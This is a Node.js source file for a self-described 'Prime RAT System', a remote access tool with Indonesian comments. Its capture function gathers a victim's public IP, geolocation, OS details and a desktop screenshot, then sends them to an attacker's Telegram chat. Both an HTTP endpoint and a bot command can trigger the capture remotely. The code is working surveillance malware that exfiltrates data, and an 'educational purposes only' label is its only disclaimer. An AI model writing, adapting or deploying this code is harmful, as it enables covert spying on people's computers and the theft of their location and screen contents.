// ==================== IMPORTS ====================
const { Telegraf } = require('telegraf');
const express = require('express');
const screenshot = require('screenshot-desktop');
const publicIp = require('public-ip');
const geoip = require('geoip-lite');
const si = require('systeminformation');
const config = require('./config');

// ==================== INIT ====================
const bot = new Telegraf(config.BOT_TOKEN);
const app = express();
app.use(express.json());

// ==================== CORE FUNCTIONS ====================

/**
 * Mengambil semua data korban + screenshot
 * @returns {Promise<Object>} Data korban lengkap
 */
async function captureVictimData() {
  const victimData = {
    timestamp: new Date().toISOString(),
    success: false,
    error: null
  };

  try {
    console.log('🔍 Starting victim data capture...');

    // 1. GET IP & LOCATION
    victimData.ip = await publicIp.v4();
    const geo = geoip.lookup(victimData.ip) || {};
    victimData.location = {
      country: geo.country || 'Unknown',
      region: geo.region || 'Unknown',
      city: geo.city || 'Unknown',
      ll: geo.ll || [0, 0]
    };

    // 2. GET SYSTEM INFO (HANYA JIKA WEB BROWSER SUPPORT)
    try {
      const osInfo = await si.osInfo();
      victimData.system = {
        platform: osInfo.platform,
        distro: osInfo.distro,
        release: osInfo.release,
        arch: osInfo.arch
      };
    } catch (sysError) {
      victimData.system = { error: 'System info not available in browser' };
    }

    // 3. CAPTURE SCREENSHOT
    console.log('📸 Capturing screenshot...');
    const screenshotBuffer = await screenshot({
      format: 'png',
      quality: 85
    });
    victimData.screenshot = screenshotBuffer.toString('base64').substring(0, 100) + '...';

    // 4. SEND TO TELEGRAM
    console.log('📤 Sending to Telegram...');
    const caption = config.VICTIM_ALERT
      .replace('{IP}', victimData.ip)
      .replace('{LOCATION}', `${victimData.location.city}, ${victimData.location.country}`)
      .replace('{OS}', victimData.system.distro || 'Unknown')
      .replace('{TIME}', new Date().toLocaleString());

    await bot.telegram.sendPhoto(
      config.CHAT_ID,
      { source: screenshotBuffer },
      { caption: caption, parse_mode: 'HTML' }
    );

    // 5. LOG DATA
    console.log('✅ Victim data captured:', {
      ip: victimData.ip,
      location: victimData.location.city,
      time: victimData.timestamp
    });

    victimData.success = true;
    return victimData;

  } catch (error) {
    console.error('❌ Capture error:', error);
    victimData.error = error.message;
    
    // Kirim error ke Telegram
    await bot.telegram.sendMessage(
      config.CHAT_ID,
      `⚠️ CAPTURE FAILED\nError: ${error.message}\nIP: ${victimData.ip || 'Unknown'}`
    );
    
    return victimData;
  }
}

// ==================== API ROUTES ====================

// Main capture endpoint
app.post(config.CAPTURE_ENDPOINT, async (req, res) => {
  console.log('🎯 Capture request received');
  
  // Basic validation
  const authKey = req.headers['x-api-key'];
  if (authKey !== config.SECRET_KEY) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const result = await captureVictimData();
  
  res.json({
    success: result.success,
    message: result.success ? 'Data captured and sent to Telegram' : 'Capture failed',
    ip: result.ip,
    location: result.location,
    timestamp: result.timestamp,
    error: result.error
  });
});

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    service: 'Prime RAT System',
    version: '2.0',
    endpoints: {
      capture: `POST ${config.CAPTURE_ENDPOINT}`,
      health: 'GET /health'
    },
    warning: 'FOR EDUCATIONAL PURPOSES ONLY'
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    bot: bot.botInfo ? 'connected' : 'disconnected'
  });
});

// ==================== TELEGRAM WEBHOOK ====================

// Webhook endpoint untuk Telegram
app.post(config.WEBHOOK_ENDPOINT, (req, res) => {
  bot.handleUpdate(req.body, res);
});

// Telegram bot commands
bot.command('start', (ctx) => {
  ctx.reply('🤖 Prime RAT System Active\nUse /capture to test');
});

bot.command('capture', async (ctx) => {
  if (ctx.from.id.toString() !== config.CHAT_ID) {
    return ctx.reply('❌ Unauthorized');
  }
  
  const msg = await ctx.reply('🔄 Capturing data...');
  const result = await captureVictimData();
  
  ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    null,
    result.success ? '✅ Capture successful' : `❌ Failed: ${result.error}`
  );
});

// ==================== SERVER START ====================

async function startServer() {
  try {
    // Start bot
    await bot.launch();
    console.log('🤖 Telegram bot launched');

    // Start Express server
    const server = app.listen(config.PORT, () => {
      console.log(`🚀 Server running on port ${config.PORT}`);
      console.log(`🔗 Local: http://localhost:${config.PORT}`);
      console.log(`📸 Capture API: POST http://localhost:${config.PORT}${config.CAPTURE_ENDPOINT}`);
      console.log(`🔐 Required header: x-api-key: ${config.SECRET_KEY}`);
    });

    // Graceful shutdown
    process.on('SIGTERM', () => {
      console.log('Shutting down...');
      bot.stop();
      server.close();
    });

  } catch (error) {
    console.error('Failed to start:', error);
    process.exit(1);
  }
}

// ==================== EXPORTS ====================

module.exports = {
  app,
  bot,
  captureVictimData
};

// Start if run directly
if (require.main === module) {
  startServer();
}